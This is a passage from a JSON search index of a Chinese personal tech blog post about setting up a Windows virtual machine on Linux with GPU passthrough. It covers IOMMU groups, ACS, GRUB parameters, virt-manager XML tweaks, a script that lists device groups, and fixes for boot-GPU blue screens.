<li>\u6700\u5b8c\u6574\u7684 Arch wiki\uff1aPCI passthrough via OVMF - ArchWiki (archlinux.org)</li> <li>KVM \u521b\u5efa\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a\u8be6\u7ec6\u535a\u5ba2\uff1aCreating a Windows 10 kvm VM on the AMD Ryzen 9 3900X using VGA Passthrough - Heiko's Blog % Virtualization (heiko-sieger.info)</li> <li>\u5e2e\u52a9\u6211\u89e3\u51b3\u4e86 windows \u84dd\u5c4f\u95ee\u9898\u7684\u535a\u5ba2\uff1aGPU passthrough - my switch to Linux</li> <li>\u6bd4\u8f83\u597d\u7684 github page\uff1aGPU Passthrough on GNU/Linux | gpu-passthrough (clayfreeman.github.io)</li> </ul> <p>PVE \u8d44\u6599</p> <ul> <li>https://pve.proxmox.com/wiki/PCI_Passthrough</li> <li>Download (spice-space.org)</li> <li>AMD 5000XT, 6000XT, reset bug: gnif/vendor-reset: Linux kernel vendor specific hardware reset module for sequences that are too complex/complicated to land in pci_quirks.c (github.com)</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u6b65\u9aa4\u603b\u7ed3","title":"\u6b65\u9aa4\u603b\u7ed3","text":"<p>\u5bf9\u4e8e\u53ef\u70ed\u63d2\u62d4\u7684\u8bbe\u5907\uff0c\u5728 virt-manger \u4e2d\u6dfb\u52a0\u9700\u8981\u76f4\u901a\u7684 host pci \u8bbe\u5907\u5373\u53ef\uff08\u53ef\u70ed\u63d2\u62d4\u7684\u8bbe\u5907\uff0c\u865a\u62df\u673a\u542f\u52a8\u65f6 vfio_pci \u63a5\u7ba1\u8bbe\u5907\u9a71\u52a8\uff0c\u5173\u95ed\u865a\u62df\u673a\u65f6\uff0chost \u53ef\u91cd\u65b0\u8bbf\u95ee\uff09\uff0c\u4f46\u662f\u5bf9\u4e8e\u663e\u5361\u8fd9\u79cd\u65e0\u6cd5\u70ed\u63d2\u62d4\u7684\u8bbe\u5907\uff0c\u5219\u8f83\u4e3a\u590d\u6742\uff1a</p> <ul> <li>\u9700\u8981\u901a\u8fc7 lspci \u547d\u4ee4\uff0c\u67e5\u770b pci \u8bbe\u5907\u7684\u603b\u7ebf\u5730\u5740\uff0c\u8bbe\u5907 id\uff0c\u4ee5\u53ca\u6240\u5904\u7684 IOMMU group</li> <li>\u5982\u679c\u663e\u5361\u5355\u72ec\u4f4d\u4e8e\u4e00\u4e2a IOMMU group\uff0c\u5219\u53ef\u4ee5\u76f4\u901a\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e4b\u540e\u6b65\u9aa4<ul> <li>\u5426\u5219\uff0c\u5c1d\u8bd5\u79fb\u52a8\u663e\u5361\u4f4d\u7f6e\uff08\u53e6\u4e00\u4e2a pciex16 \u7684\u69fd\uff09\uff0c\u770b\u662f\u5426\u4e3a\u5355\u72ec group</li> <li>\u4e0d\u884c\u7684\u8bdd\u9700\u8981\u5c1d\u8bd5 ACS patch\uff08\u89c1\u540e\uff09\uff0c\u53ef\u80fd\u5bfc\u81f4\u4e0d\u7a33\u5b9a</li> </ul> </li> </ul> <p>\u786e\u5b9a\u53ef\u4ee5\u76f4\u901a\u540e\u6b65\u9aa4\uff1a</p> <ul> <li>bios \u5f00\u542f\u865a\u62df\u5316(intel: vt-x, AMD: SVM) \u548ciommu(intel: vt-d, AMD: AMD-Vi) \u652f\u6301<ul> <li>\u4ee5\u6211\u7684 AMD \u5e73\u53f0\u4e3a\u4f8b\uff0c\u9700\u8981\u5f00\u542f SVM\uff0cIOMMU\uff0cACS\uff08\u4f4d\u4e8e AMD CBS \u4e2d\uff0cBIOS \u4e2d\u641c\u7d22\u5173\u952e\u8bcd\u5373\u53ef\uff09</li> </ul> </li> <li>virt-manger \u4e2d\u6dfb\u52a0 pci \u8bbe\u5907\uff0c\u9009\u62e9\u663e\u5361 group \u4e0b\u7684\u6240\u6709\u8bbe\u5907\uff08\u901a\u5e38\u53e6\u4e00\u4e2a\u4e3a\u58f0\u5361\uff09</li> <li> <p>grub \u4fee\u6539\u5185\u6838\u542f\u52a8\u53c2\u6570\uff08grub2 \u901a\u8fc7\u7f16\u8f91/etc/default/grub\uff0c\u7136\u540e sudo update-grub\uff09</p> <ul> <li>\u5f00\u542f iommu</li> <li>\u5728\u542f\u52a8\u65f6\u5c06\u663e\u5361\u7ed1\u5b9a\u5230 vifo_pci \u9a71\u52a8\u4e0a\uff08\u8fd8\u6709\u76f8\u540c group \u4e0b\u7684\u58f0\u5361\uff09</li> <li>\u6700\u7ec8\u6211\u7684\u542f\u52a8\u53c2\u6570\u793a\u4f8b</li> </ul> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash amd_iommu=on vfio_pci.ids=10de:1d01,10de:0fb8 kvm.ignore_msrs=1\"\n</code></pre> </li> </ul> <ul> <li> <p>\u663e\u5361\u5904\u4e8e\u865a\u62df\u5316\u73af\u5883\u4e2d\u4f1a\u62d2\u7edd\u5de5\u4f5c\uff0c\u9700\u8981\u5728 virt-manger XML \u4e2d\u6dfb\u52a0\u989d\u5916\u53c2\u6570\u3002\u53c2\u8003archiwiki</p> <ul> <li>vendor_id\uff1a\u5bf9\u4e8e Nvidia \u7684\u663e\u5361\uff0c\u4f1a\u62a5 43 \u9519\u8bef\u3002\u5728\u65e9\u671f\u7684\u9a71\u52a8\u9700\u8981\u4e0b\u9762\u7684 vendor_id\uff0c\u4f46\u662f\u6700\u65b0\u7684\u663e\u5361\u9a71\u52a8\u5df2\u7ecf\u4e0d\u9700\u8981\u4e86\u3002\u5728 windows \u5185\u66f4\u65b0\u663e\u5361\u9a71\u52a8\u4fbf\u4f1a\u6b63\u5e38\u5de5\u4f5c\u3002</li> <li>hidden\uff1a\u8ba9\u663e\u5361\u4e0d\u77e5\u9053\u4f4d\u4e8e\u865a\u62df\u673a\u4e2d\uff08windows \u8fd8\u662f\u77e5\u9053\u7684\uff09</li> </ul> <pre><code>&lt;features&gt;\n  ...\n  &lt;hyperv&gt;\n    ...\n    &lt;vendor_id state='on' value='randomid'/&gt;\n    ...\n  &lt;/hyperv&gt;\n  &lt;kvm&gt;\n    &lt;hidden state='on'/&gt;\n  &lt;/kvm&gt;\n  ...\n&lt;/features&gt;\n</code></pre> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u4ec0\u4e48\u662f-iommu","title":"\u4ec0\u4e48\u662f IOMMU","text":"<p>\u5173\u4e8e IOMMU \u548c ACS\uff1a</p> <p></p> <ul> <li>PCIE \u652f\u6301 requst id\uff0c\u56e0\u6b64\u53ef\u4ee5\u8bc6\u522b\u4e0d\u540c\u8bbe\u5907\uff0c\u6bcf\u4e2a\u8bbe\u5907\u53ef\u4ee5\u4f7f\u7528\u81ea\u5df1\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4 (I/O virtual address, IOVA)\uff0cIOMMU \u8d1f\u8d23\u8f6c\u6362</li> <li>\u7136\u540e\u8bbe\u5907\u4e4b\u95f4\u8fd8\u53ef\u4ee5\u901a\u8fc7 DMA \u76f4\u63a5 peer to peer \u901a\u4fe1\uff0c\u8fd9\u4e9b\u901a\u4fe1\u4e0d\u7ecf\u8fc7 IOMMU\uff0c\u56e0\u6b64\u53ef\u80fd\u5bfc\u81f4\u95ee\u9898\uff0c\u6bd4\u5982\u7f51\u5361\u7684 DMA \u8bf7\u6c42\u53d1\u9001\u5230\u4e86\u78c1\u76d8\u3002PCIe Access Control Services (ACS) \u4fbf\u7528\u4e8e\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5b83\u4f7f\u6211\u4eec\u80fd\u591f\u77e5\u9053\u8bbe\u5907\u95f4\u662f\u5426\u80fd\u591f\u76f4\u63a5\u901a\u4fe1\u4ee5\u53ca\u662f\u5426\u80fd\u591f\u5173\u95ed\u3002</li> <li>\u5bf9\u4e8e\u4e0d\u652f\u6301 ACS \u7684\u8bbe\u5907\uff0cIOMMU \u5c06\u5176\u5f52\u4e3a\u4e00\u4e2a group\u3002</li> <li>PCI \u76f4\u901a\u5fc5\u987b\u76f4\u901a\u4e00\u4e2a IOMMU group \u7684\u6240\u6709\u8bbe\u5907\uff08\u9664\u6389\u7279\u6b8a\u7684 PCI root \u8bbe\u5907\uff09</li> </ul> <p>PCIe \u8fde\u63a5\u7684\u901a\u9053\u7531 CPU \u6216\u8005\u4e3b\u677f\u82af\u7247\u7ec4\uff08\u4ee5\u524d\u7684\u5357\u5317\u6865\uff09\u63d0\u4f9b\u3002\u662f\u5426\u652f\u6301 ACS \u548c CPU \u6709\u5173</p> <p>On a typical Intel chipset, PCIe root ports are provided via both the processor and the PCH (Platform Controller Hub). \u00a0The capabilities of these root ports can be very different. \u00a0On the latest Linux kernels we have support for exposing the isolation of the PCH root ports, even though many of them do not have native PCIe ACS support. On Xeon class processors (except E3-1200 series), the processor-based PCIe root ports typically support ACS. \u00a0Client processors, such as the i5/i7 Core processor do not support ACS, but we can hope future products from Intel will update this support.</p> <p>You cannot change the IOMMU groups. It is determined by the motherboard and the BIOS. You can put it in different slots and see if that helps. You can try different BIOS versions, or buy a X570 motherboard. And you can use the pcie_acs_override if you don't care about the device isolation, which means that the device passed through to the VM can still talk to the host and/or devices in other VMs.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u67e5\u770b\u4e3b\u677f-iommu-\u7ec4\u5206\u5e03","title":"\u67e5\u770b\u4e3b\u677f iommu \u7ec4\u5206\u5e03","text":"<p>\u4f7f\u7528\u4e0b\u9762\u811a\u672c\uff0c\u5f97\u5230\u4e3b\u677f\u4e0a iommu \u7ec4\u7684\u4fe1\u606f</p> <pre><code>#!/bin/bash\nshopt -s nullglob\nfor g in $(find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V); do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n</code></pre> <p>\u6211\u7684 IOMMU \u5206\u5e03 \u53ef\u77e5\uff1a</p> <ul> <li>\u9760\u8fd1 CPU \u4e00\u4fa7\u7684 nvme \u63d2\u69fd\uff08PCIE 4.0 x 4\uff09\u4f4d\u4e8e\u5355\u72ec\u7684 14 \u53f7\u7ec4\uff08CPU \u901a\u9053\uff09</li> <li>\u4f4d\u4e8e\u9760\u8fd1 CPU \u7684\u4e00\u4fa7\u7684\u663e\u5361\u63d2\u69fd\uff08PCIE 4.0 x16\uff09\u4f4d\u4e8e\u5355\u72ec\u7684 16 \u53f7\u7ec4\uff08CPU \u901a\u9053\uff09</li> <li>\u5176\u4f59\uff1a\u663e\u5361\u63d2\u69fd 2\uff08PCIE 3.0 x4\uff09\u3001nvme \u63d2\u69fd\uff08PCIE 3.0 x 4\uff09\u3001\u4ee5\u592a\u7f51\u5361\u3001wifi6 \u65e0\u7ebf\u7f51\u5361\u548c SATA \u63a7\u5236\u5668\u3001USB \u63a7\u5236\u5668\u5747\u4f4d\u4e8e 15 \u53f7\u7ec4\uff08\u4e3b\u677f\u901a\u9053\uff09</li> </ul> <pre><code>Please be patient. This may take a couple seconds.\nGroup:  0   0000:00:01.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  1   0000:00:01.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  2   0000:00:01.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  3   0000:00:02.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  4   0000:00:03.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  5   0000:00:03.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  6   0000:00:04.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  7   0000:00:05.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  8   0000:00:07.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  9   0000:00:07.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Internal PCIe GPP Bridge 0 to bus[E:B] [1022:1484]   Driver: pcieport\nGroup:  10  0000:00:08.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  11  0000:00:08.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Internal PCIe GPP Bridge 0 to bus[E:B] [1022:1484]   Driver: pcieport\nGroup:  12  0000:00:14.0 SMBus [0c05]: Advanced Micro Devices, Inc. [AMD] FCH SMBus Controller [1022:790b] (rev 61)   Driver: piix4_smbus\nGroup:  12  0000:00:14.3 ISA bridge [0601]: Advanced Micro Devices, Inc. [AMD] FCH LPC Bridge [1022:790e] (rev 51)\nGroup:  13  0000:00:18.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 0 [1022:1440]\nGroup:  13  0000:00:18.1 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 1 [1022:1441]\nGroup:  13  0000:00:18.2 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 2 [1022:1442]\nGroup:  13  0000:00:18.3 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 3 [1022:1443]   Driver: k10temp\nGroup:  13  0000:00:18.4 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 4 [1022:1444]\nGroup:  13  0000:00:18.5 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 5 [1022:1445]\nGroup:  13  0000:00:18.6 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 6 [1022:1446]\nGroup:  13  0000:00:18.7 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 7 [1022:1447]\nGroup:  14  0000:01:00.0 Non-Volatile memory controller [0108]: Samsung Electronics Co Ltd NVMe SSD Controller PM9A1/PM9A3/980PRO [144d:a80a]   Driver: nvme\nGroup:  15  0000:02:00.0 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ee]   Driver: xhci_hcd\nGroup:  15  0000:02:00.1 SATA controller [0106]: Advanced Micro Devices, Inc. [AMD] Device [1022:43eb]   Driver: ahci\nGroup:  15  0000:02:00.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43e9]   Driver: pcieport\nGroup:  15  0000:03:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:03:04.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:03:08.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:03:09.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:04:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Baffin [Radeon RX 550 640SP / RX 560/560X] [1002:67ff] (rev ff)   Driver: amdgpu\nGroup:  15  0000:04:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Baffin HDMI/DP Audio [Radeon RX 550 640SP / RX 560/560X] [1002:aae0]   Driver: snd_hda_intel\nGroup:  15  0000:05:00.0 Non-Volatile memory controller [0108]: KIOXIA Corporation NVMe SSD [1e0f:0009] (rev 01)   Driver: nvme\nGroup:  15  0000:06:00.0 Network controller [0280]: Intel Corporation Wi-Fi 6 AX200 [8086:2723] (rev 1a)   Driver: iwlwifi\nGroup:  15  0000:07:00.0 Ethernet controller [0200]: Realtek Semiconductor Co., Ltd. RTL8125 2.5GbE Controller [10ec:8125] (rev 05)   Driver: r8169\nGroup:  16  0000:08:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP106 [GeForce GTX 1060 3GB] [10de:1c02] (rev a1)   Driver: vfio-pci\nGroup:  16  0000:08:00.1 Audio device [0403]: NVIDIA Corporation GP106 High Definition Audio Controller [10de:10f1] (rev a1)   Driver: vfio-pci\nGroup:  17  0000:09:00.0 Non-Essential Instrumentation [1300]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Function [1022:148a]\nGroup:  18  0000:0a:00.0 Non-Essential Instrumentation [1300]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Reserved SPP [1022:1485]\nGroup:  19  0000:0a:00.1 Encryption controller [1080]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Cryptographic Coprocessor PSPCPP [1022:1486]   Driver: ccp\nGroup:  20  0000:0a:00.3 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD] Matisse USB 3.0 Host Controller [1022:149c]   Driver: xhci_hcd\nGroup:  21  0000:0a:00.4 Audio device [0403]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse HD Audio Controller [1022:1487]   Driver: snd_hda_intel\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u4e00\u4e2a-group-\u91cc\u6709\u591a\u4e2a\u8bbe\u5907\u600e\u4e48\u529e","title":"\u4e00\u4e2a group \u91cc\u6709\u591a\u4e2a\u8bbe\u5907\u600e\u4e48\u529e","text":"<p>\u4e3b\u677f\u4e0a\u7684\u4e0d\u540c PCIe slot \u53ef\u4ee5\u8fde\u63a5\u5230 CPU \u4e0a\u6216\u8005 PCH(\u4e3b\u677f\u82af\u7247\u7ec4) \u4e0a\u3002\u6211\u7684\u4e3b\u677f\u8c8c\u4f3c\u5c06\u6240\u6709\u8bbe\u5907\u90fd\u653e\u5165\u4e86\u4e00\u4e2a group\u3002\u56e0\u6b64\u6211\u7684\u663e\u5361 2 \u548c nvme \u56fa\u6001\u76d8\u7b49\u8bbe\u5907\u90fd\u65e0\u6cd5\u76f4\u901a\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7ec4\u91cc\u6709\u5f88\u591a\u8bbe\u5907\u6709\u4e00\u4e9b\u89e3\u51b3\u65b9\u6cd5\uff1aIOMMU Groups - What You Need to Consider - Heiko's Blog - VFIO (heiko-sieger.info)</p> <ul> <li>\u66f4\u65b0\u5185\u6838\u7248\u672c\uff0c\u65b0\u7684\u5185\u6838\u7248\u672c\u53ef\u80fd\u5bf9\u4e3b\u677f\u652f\u6301\u7684\u66f4\u597d\uff0cIOMMU group \u4f1a\u6539\u53d8</li> <li>\u79fb\u52a8\u8bbe\u5907\u4f4d\u7f6e</li> <li>\u5b89\u88c5 kernel patch\uff1ahttps://wiki.archlinux.org/title/PCI_passthrough_via_OVMF#Bypassing_the_IOMMU_groups_(ACS_override_patch)</li> </ul> <p>\u4f46\u662f\u6211\u76ee\u524d\u5c31\u9009\u62e9\u76f4\u901a slot 1 \u663e\u5361\u7b97\u4e86\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u76f4\u901a-slot1-\u6216-slot2-\u7684\u6743\u8861","title":"\u76f4\u901a slot1 \u6216 slot2 \u7684\u6743\u8861","text":"<p>\u76f4\u901a slot1</p> <ul> <li>slot1 \u663e\u5361\u7684\u98ce\u6247\u4f1a\u88ab slot2 \u663e\u5361\u7684 PCB \u7248\u6321\u4f4f\uff0c\u6563\u70ed\u4e0d\u592a\u597d<ul> <li>\u89e3\u51b3\u65b9\u6cd5\uff1a\u4f7f\u7528 PCIE \u663e\u5361\u5ef6\u957f\u7ebf\uff08\u4f46\u662f x16 \u7684\u592a\u8d35\u4e86\uff0c90RMB\uff09</li> </ul> </li> <li>boot gpu \u9ed8\u8ba4\u4e3a slot 1 \u7684\u95ee\u9898\u3002BIOS \u65e0\u6cd5\u8bbe\u7f6e primary display\uff0c\u5bfc\u81f4 windows \u865a\u62df\u673a\u4f1a\u84dd\u5c4f (PCI passthrough via OVMF - Passing_the_boot_GPU_to_the_guest<ul> <li>\u8be5\u95ee\u9898\u5df2\u89e3\u51b3</li> </ul> </li> </ul> <p>\u76f4\u901a slot2</p> <ul> <li>slot2 \u548c\u4e3b\u677f\u4e0a\u7684\u5176\u5b83\u8bbe\u5907\u4f4d\u4e8e\u4e00\u7ec4\uff0c\u65e0\u6cd5\u76f4\u901a slot2<ul> <li>\u4f7f\u7528 ACS patch</li> </ul> </li> <li>\u6211 B550 \u7684\u4e3b\u677f\uff0cslot2 \u7684\u867d\u7136\u662f x16 \u957f\u5ea6\u7684\uff0c\u4f46\u662f\u53ea\u6709 x4 PCIE 3.0 \u7684\u5e26\u5bbd\uff0c\u663e\u5361\u4e00\u822c\u6700\u5c11\u9700\u8981 x8 PCIE 3.0\uff0c\u5426\u5219\u4f1a\u5bf9\u6027\u80fd\u6709\u5f71\u54cd\uff0c\u751a\u81f3\u65e0\u6cd5\u5de5\u4f5c<ul> <li>\u4e00\u822c\u6765\u8bf4\u53cc\u663e\u5361\u65f6\uff0c\u4e24\u4e2a\u69fd\u5e94\u8be5\u90fd\u662f\u5de5\u4f5c\u5728 x8 \u7684\u6a21\u5f0f\u4e0b\u7684\u5427\u3002\u4e3a\u4f55\u6211\u7684\u4e3b\u677f\u4e0d\u652f\u6301\u5c06 slot1 \u7684 lane \u5206\u7ed9 slot2 \u5462\uff1f(\u56e0\u4e3aslot1 pcie\u901a\u9053\u6765\u81eaCPU\uff0cslot2\u6765\u81ea\u4e3b\u677f)</li> </ul> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u76f4\u901a-boot-gpu\u7684\u95ee\u9898","title":"\u76f4\u901a boot gpu\u7684\u95ee\u9898","text":"<p>\u76f4\u901a boot gpu \u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u8fd9\u91cc\u662f\u5bf9\u8be5\u95ee\u9898\u7684\u8fdb\u4e00\u6b65\u603b\u7ed3</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u53c2\u8003\u8d44\u6599_1","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u95ee\u9898\u76f8\u5173\u8ba8\u8bba\uff1aGPU Assistance - Select boot GPU - Software &amp; Operating Systems / VFIO - Level1Techs Forums<ul> <li>\u8981\u4e48 bios \u652f\u6301\u9009\u62e9 primary gpu</li> <li>\u8981\u4e48 swap gpu slot</li> </ul> </li> <li>\u89e3\u91ca\u95ee\u9898\u539f\u7406\uff0c\u4ee5\u53ca\u89e3\u51b3\uff1aExplaining CSM, efifb=off, and Setting the Boot GPU Manually - The Passthrough POST</li> <li>\u662f\u5426\u9700\u8981 dump vbios\uff1a(8) When is a GPU ROM required and how does it get used? : VFIO (reddit.com)</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u95ee\u9898\u53ef\u80fd\u5bfc\u81f4\u7684\u73b0\u8c61","title":"\u95ee\u9898\u53ef\u80fd\u5bfc\u81f4\u7684\u73b0\u8c61","text":"<ul> <li>windows\u5faa\u73af\u84dd\u5c4f\u3002\u81ea\u5df1\u76f4\u901a1063\u9047\u5230\u7684\uff0c\u89e3\u51b3\u529e\u6cd5\u53ef\u4ee5\u4e0d\u63d2\u663e\u793a\u5668\u542f\u52a8\uff0c\u6216\u8005\u4f7f\u7528\u547d\u4ee4reset\u663e\u5361</li> <li>\u62a543\u9519\u8bef\uff0c\u9a71\u52a8\u5b89\u88c5\u4e0d\u4e0a\u30021060\u6362\u6210AMD 6500xt\u65f6\u9047\u5230\u7684\uff0c\u89e3\u51b3\u529e\u6cd5\u5c31\u662f\u4e0d\u63d2\u663e\u793a\u5668\u542f\u52a8\u3002\uff08\u540e\u9762\u7ed9czw\u5728PVE\u91cc\u76f4\u901aamd 6500xt\u65f6\u53c8\u9047\u5230\u4e00\u6837\u95ee\u9898\uff0c\u4f46\u662f\u89e3\u51b3\u529e\u6cd5\u4e0d\u4e00\u6837\u3002</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u95ee\u9898\u539f\u56e0","title":"\u95ee\u9898\u539f\u56e0","text":"<ul> <li>uefi \u662f\u7535\u8111\u542f\u52a8\u540e cpu \u6700\u65e9\u8fd0\u884c\u7684\u4ee3\u7801</li> <li>uefi \u9700\u8981\u521d\u59cb\u5316 primary gpu\uff0c\u56e0\u4e3a\u9700\u8981\u8bbe\u7f6e\u83dc\u5355\u3002This is because UEFI setup menus, along with boot splash screens, must work in a generic way, as UEFI cannot possibly include a driver for every possible GPU.</li> <li>UEFI \u521d\u59cb\u5316\u540e\uff0c\u66b4\u9732\u7ed9 linux \u7684\u662f\u4fee\u6539\u540e\u7684 vBIOS (shadow copy)\u3002If the host UEFI already initialized the device, the host UEFI makes a\u201cshadow\u201dcopy of the GPU\u2019s vBIOS on startup, and that is what Linux exposes as the device\u2019s vBIOS.</li> <li>guest \u4e5f\u6709\u81ea\u5df1\u7684 UEFI\uff08\u5f00\u6e90\u7684 OVMF\uff09\uff0c\u4e5f\u9700\u8981\u521d\u59cb\u5316\u8bbe\u5907\u3002\u800c host \u66b4\u9732\u7ed9 guest \u7684\u662f shadow copy\uff0c\u6545\u51b2\u7a81\u3002OVMF usually hangs at this stage.</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5-0\u5173\u95ed\u663e\u793a\u5668\u542f\u52a8","title":"\u65b9\u6cd5 0\uff1a\u5173\u95ed\u663e\u793a\u5668\u542f\u52a8","text":"<p>\u5173\u95ed primary gpu \u7684\u663e\u793a\u5668\uff0csecond gpu \u63d2\u4e0a hdmi \u6b3a\u9a97\u5668\uff08\u4e0d\u63d2\u7684\u8bdd\u76f8\u5f53\u4e8e\u6ca1\u6709\u663e\u793a\u5668\uff0c\u542f\u52a8\u65f6\u81ea\u68c0\uff0c\u663e\u5361\u4eae\u767d\u706f\uff0c\u4f46\u662f\u5bf9\u4e8elinux\u8fd8\u662f\u53ef\u4ee5\u8fdb\u5165\u7cfb\u7edf\uff09</p> <p>\u53ef\u4ee5\u4f7f\u7528\u811a\u672c\u907f\u514d\u91cd\u542f\u7535\u8111\uff0c\u53c2\u8003\u9047\u5230\u7684\u95ee\u9898\u91cc\u7684[Windows 